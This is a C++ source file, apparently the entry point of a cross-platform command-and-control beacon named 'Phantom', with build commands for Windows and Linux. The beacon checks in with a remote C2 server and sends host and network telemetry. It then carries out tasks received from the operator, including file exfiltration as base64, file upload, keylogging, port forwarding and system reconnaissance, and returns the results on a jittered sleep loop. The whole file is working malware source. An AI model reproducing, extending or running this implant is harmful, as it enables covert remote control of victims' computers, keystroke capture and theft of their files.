// ============================================================================
//  main.cpp — Phantom Beacon Entry Point (Cross-Platform)
//  ──────────────────────────────────────────────────────────
//  Beacon loop: check-in → receive tasks → execute → send results → sleep.
//
//  Build (Windows - MinGW-w64):
//    x86_64-w64-mingw32-g++ -std=c++17 -O2 -s -o beacon.exe main.cpp \
//        -lwinhttp -lbcrypt -lws2_32 -static
//
//  Build (Windows - MSVC):
//    cl /EHsc /O2 /std:c++17 main.cpp /link winhttp.lib bcrypt.lib ws2_32.lib
//
//  Build (Linux / macOS):
//    g++ -std=c++17 -O2 -s -o beacon main.cpp -lcurl -lssl -lcrypto -lpthread
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <fstream>
    #include <chrono>
    #include <thread>
    #include <cstring>
    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
#endif
#include <cstdlib>
#include <ctime>
#include <string>
#include <sstream>
#include <fstream>
#include <algorithm>

#include "evasion.h"
#include "crypto.h"
#include "network.h"
#include "recon.h"
#include "portfwd.h"
#include "keylogger.h"

// ── Minimal JSON Parser ────────────────────────────────────────────────────
// We avoid pulling in nlohmann/json to keep the binary tiny.
// This is a purpose-built parser for our specific C2 protocol.

namespace json_mini {

// Extract a string value for a given key from a JSON object string
inline std::string get_string(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.length();
    size_t end = json.find('"', pos);
    if (end == std::string::npos) return "";

    // Unescape basic sequences
    std::string val = json.substr(pos, end - pos);
    std::string result;
    for (size_t i = 0; i < val.size(); ++i) {
        if (val[i] == '\\' && i + 1 < val.size()) {
            switch (val[i + 1]) {
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"':  result += '"';  break;
                default:   result += val[i + 1]; break;
            }
            ++i;
        } else {
            result += val[i];
        }
    }
    return result;
}

// Extract the "tasks" array from C2 response: [{"task_id":"...","command":"..."},...]
struct Task {
    std::string task_id;
    std::string command;
};

inline std::vector<Task> parse_tasks(const std::string& json) {
    std::vector<Task> tasks;
    // Find the "tasks" array
    size_t arr_start = json.find("\"tasks\":[");
    if (arr_start == std::string::npos) return tasks;
    arr_start = json.find('[', arr_start);

    // Find each { ... } object in the array
    size_t pos = arr_start;
    while (true) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos) break;
        size_t obj_end = json.find('}', obj_start);
        if (obj_end == std::string::npos) break;

        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        Task t;
        t.task_id = get_string(obj, "task_id");
        t.command = get_string(obj, "command");
        if (!t.task_id.empty()) tasks.push_back(t);

        pos = obj_end + 1;
    }
    return tasks;
}

}  // namespace json_mini

// ── Command Dispatcher ─────────────────────────────────────────────────────

std::string dispatch_command(const std::string& cmd) {
    // Parse command and arguments
    std::istringstream iss(cmd);
    std::string action;
    iss >> action;

    if (action == "recon") {
        std::string path;
        std::getline(iss >> std::ws, path);
        return recon::format_human(path);
    }
    else if (action == "ls" || action == "dir") {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) path = ".";
        auto entries = recon::list_directory(path);
        std::ostringstream out;
        for (auto& e : entries) {
            out << (e.isDir ? "[DIR]  " : "[FILE] ") << e.name;
            if (!e.isDir) out << "  (" << e.size << " bytes)";
            out << "\n";
        }
        return out.str();
    }
    else if (action == "drives") {
        auto drives = recon::enumerate_drives();
        std::ostringstream out;
        for (auto& d : drives) {
            double totalGB = d.totalBytes / (1024.0 * 1024.0 * 1024.0);
            double freeGB  = d.freeBytes  / (1024.0 * 1024.0 * 1024.0);
            out << d.letter << "  [" << d.type << "]"
                << "  Total: " << static_cast<int>(totalGB) << " GB"
                << "  Free: "  << static_cast<int>(freeGB)  << " GB\n";
        }
        return out.str();
    }
    else if (action == "whoami") {
#ifdef _WIN32
        char user[256], computer[256];
        DWORD usize = sizeof(user), csize = sizeof(computer);
        GetUserNameA(user, &usize);
        GetComputerNameA(computer, &csize);
        return std::string("User: ") + user + "\nComputer: " + computer + "\n";
#else
        char hostname[256] = {0};
        gethostname(hostname, sizeof(hostname));
        const char* user = getenv("USER");
        if (!user) user = "unknown";
        return std::string("User: ") + user + "\nHostname: " + hostname + "\n";
#endif
    }
    else if (action == "portfwd") {
        int localPort, remotePort;
        std::string remoteHost;
        if (iss >> localPort >> remoteHost >> remotePort) {
            return portfwd::start_forward(localPort, remoteHost, remotePort);
        }
        return "Usage: portfwd <local_port> <remote_host> <remote_port>";
    }
    else if (action == "portfwd-stop") {
        return portfwd::stop_all_forwards();
    }
    else if (action == "download") {
        std::string filepath;
        std::getline(iss >> std::ws, filepath);
        if (filepath.empty()) return "Usage: download <filepath>";

#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return "Error: Cannot open file " + filepath;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
            CloseHandle(hFile);
            return "Error: File too large or invalid";
        }

        std::vector<BYTE> buffer(fileSize);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hFile);

        buffer.resize(bytesRead);
        return "FILE_B64:" + crypto::base64_encode(buffer);
#else
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return "Error: Cannot open file " + filepath;

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        if (fileSize > 10 * 1024 * 1024) return "Error: File too large";
        file.seekg(0, std::ios::beg);

        std::vector<BYTE> buffer(fileSize);
        file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
        buffer.resize(file.gcount());
        return "FILE_B64:" + crypto::base64_encode(buffer);
#endif
    }
    else if (action == "upload") {
        std::string filepath, b64data;
        iss >> filepath >> b64data;
        if (filepath.empty() || b64data.empty())
            return "Usage: upload <filepath> <base64_data>";

        auto data = crypto::base64_decode(b64data);
#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return "Error: Cannot create file " + filepath;

        DWORD bytesWritten;
        WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
        CloseHandle(hFile);
        return "Uploaded " + std::to_string(bytesWritten) + " bytes to " + filepath;
#else
        std::ofstream file(filepath, std::ios::binary);
        if (!file) return "Error: Cannot create file " + filepath;

        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return "Uploaded " + std::to_string(data.size()) + " bytes to " + filepath;
#endif
    }
    else if (action == "sysinfo") {
        return recon::get_sysinfo();
    }
    else if (action == "netinfo") {
        return recon::get_netinfo();
    }
    else if (action == "processes") {
        return recon::get_processes();
    }
    else if (action == "find") {
        std::string root, pattern;
        iss >> root >> pattern;
        if (root.empty() || pattern.empty()) return "Usage: find <root> <pattern>";
        return recon::find_files(root, pattern);
    }
    else if (action == "pwd") {
#ifdef _WIN32
        char buf[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buf);
        return std::string(buf) + "\n";
#else
        char buf[1024];
        if (getcwd(buf, sizeof(buf))) return std::string(buf) + "\n";
        return "Error getting current directory\n";
#endif
    }
    else if (action == "cd") {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return "Usage: cd <path>";
#ifdef _WIN32
        if (SetCurrentDirectoryA(path.c_str())) return "Directory changed to " + path + "\n";
#else
        if (chdir(path.c_str()) == 0) return "Directory changed to " + path + "\n";
#endif
        return "Error changing directory\n";
    }
    else if (action == "cat") {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return "Usage: cat <file>";
        std::ifstream f(path, std::ios::binary);
        if (!f) return "Error: Cannot open file " + path;
        
        f.seekg(0, std::ios::end);
        size_t size = f.tellg();
        if (size > 5 * 1024 * 1024) return "Error: File too large to cat (max 5MB). Use download.";
        f.seekg(0, std::ios::beg);
        
        std::ostringstream ss;
        ss << f.rdbuf();
        return ss.str();
    }
    else if (action == "sleep") {
        return "SLEEP_SET";
    }
    else if (action == "keylog") {
        std::string subCmd;
        iss >> subCmd;
        if (subCmd == "start") return keylogger::start();
        if (subCmd == "stop")  return keylogger::stop();
        if (subCmd == "dump")  return keylogger::dump();
        return "Usage: keylog <start|stop|dump>";
    }
    else if (action == "exit" || action == "kill") {
        return "EXIT";
    }

    return "Unknown command: " + cmd;
}


// ── Generate Beacon ID ─────────────────────────────────────────────────────

std::string generate_beacon_id() {
#ifdef _WIN32
    char computer[256];
    DWORD csize = sizeof(computer);
    GetComputerNameA(computer, &csize);
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string("PHANTOM-") + computer + "-" + hex;
#else
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string("PHANTOM-") + hostname + "-" + hex;
#endif
}


// ── Beacon Main Loop ──────────────────────────────────────────────────────

void beacon_main(int argc, char** argv) {
#ifdef _WIN32
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#else
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
#endif

    // Configure C2 connection
    net::C2Config cfg;
    cfg.beacon_id = generate_beacon_id();
    cfg.sleep_ms  = 5000;   // 5 second base interval
    cfg.jitter    = 30;     // ±30% jitter

    // Parse command line for C2 host:port (e.g., "beacon 192.168.1.100 8443")
    if (argc >= 2) {
        cfg.host = std::wstring(std::string(argv[1]).begin(), std::string(argv[1]).end());
        if (argc >= 3) cfg.port = std::atoi(argv[2]);
    }

    // ── Beacon Loop ────────────────────────────────────────────────────────
    bool alive = true;
    bool first_checkin = true;

    // Helper for escaping telemetry json
    auto escape_json = [](const std::string& s) {
        std::string res;
        for (char c : s) {
            if (c == '"') res += "\\\"";
            else if (c == '\\') res += "\\\\";
            else if (c == '\n') res += "\\n";
            else if (c == '\r') res += "\\r";
            else if (c == '\t') res += "\\t";
            else res += c;
        }
        return res;
    };

    while (alive) {
        // 1. Check in with C2
        std::string telemetry = "";
        if (first_checkin) {
            telemetry = "{\"sysinfo\":\"" + escape_json(recon::get_sysinfo()) + 
                        "\",\"netinfo\":\"" + escape_json(recon::get_netinfo()) + "\"}";
        }
        std::string response = net::checkin(cfg, telemetry);
        if (!response.empty()) first_checkin = false;

        if (!response.empty()) {
            // 2. Parse tasks
            auto tasks = json_mini::parse_tasks(response);

            for (auto& task : tasks) {
                // 3. Execute each task
                std::string output = dispatch_command(task.command);

                // Handle special responses
                if (output == "EXIT") {
                    alive = false;
                    break;
                }
                if (output == "SLEEP_SET") {
                    std::istringstream iss(task.command);
                    std::string _; int newSleep;
                    iss >> _ >> newSleep;
                    if (newSleep >= 1000) {
                        cfg.sleep_ms = newSleep;
                        output = "Sleep set to " + std::to_string(newSleep) + "ms";
                    } else {
                        output = "Invalid sleep value (minimum 1000ms)";
                    }
                }

                // 4. Send result back to C2
                net::send_result(cfg, task.task_id, output);
            }
        }

        // 5. Sleep with jitter
        Sleep(cfg.get_sleep_ms());
    }

    // Cleanup
    portfwd::stop_all_forwards();
#ifdef _WIN32
    WSACleanup();
#endif
}


// ── Entry Point ────────────────────────────────────────────────────────────

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    // Convert lpCmdLine to argc/argv
    int argc = 0;
    char** argv = nullptr;
    
    // Simple parsing: split lpCmdLine by spaces
    std::vector<std::string> args;
    args.push_back("beacon.exe");
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        std::istringstream iss(lpCmdLine);
        std::string token;
        while (iss >> token) args.push_back(token);
    }
    
    std::vector<char*> argv_ptrs;
    for (auto& a : args) argv_ptrs.push_back(&a[0]);
    
    beacon_main(static_cast<int>(argv_ptrs.size()), argv_ptrs.data());
    return 0;
}
#else
int main(int argc, char** argv) {
    beacon_main(argc, argv);
    return 0;
}
#endif

